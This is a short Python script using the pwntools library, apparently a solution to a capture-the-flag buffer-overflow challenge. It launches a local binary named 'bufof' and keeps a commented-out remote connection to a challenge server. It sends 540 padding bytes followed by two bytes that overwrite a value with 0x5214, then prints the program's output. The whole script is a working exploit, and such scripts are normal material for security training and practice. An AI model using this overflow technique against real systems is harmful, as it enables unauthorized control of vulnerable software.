#!/bin/python3

from pwn import *

p = process('./bufof')
# p = remote('159.65.158.51',2226)
p.sendline(b'a'*540+'\x14\x52'.encode()) # 540 bytes to fill the buffer and 21012 = 0x5214
print(p.recvall().decode())